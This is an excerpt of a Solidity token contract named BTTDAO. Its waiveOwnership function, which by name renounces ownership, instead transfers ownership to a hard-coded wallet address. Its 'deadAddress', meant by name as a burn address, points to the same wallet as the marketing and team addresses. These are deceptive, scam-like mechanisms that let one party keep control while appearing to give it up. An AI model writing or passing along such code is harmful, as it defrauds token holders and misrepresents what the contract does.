...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x8ed82Bc4737F1E0e735C5EDd98e2b39E79958284));
        _owner = address(0x8ed82Bc4737F1E0e735C5EDd98e2b39E79958284);
    }
...
contract BTTDAO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BTTDAO";
    string private _symbol = "BTTDAO";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xc13BB59c3aF32DF215D09f85dAbc54BB20db369c);
    address payable public teamWalletAddress = payable(0xc13BB59c3aF32DF215D09f85dAbc54BB20db369c);
    address public immutable deadAddress = 0xc13BB59c3aF32DF215D09f85dAbc54BB20db369c;
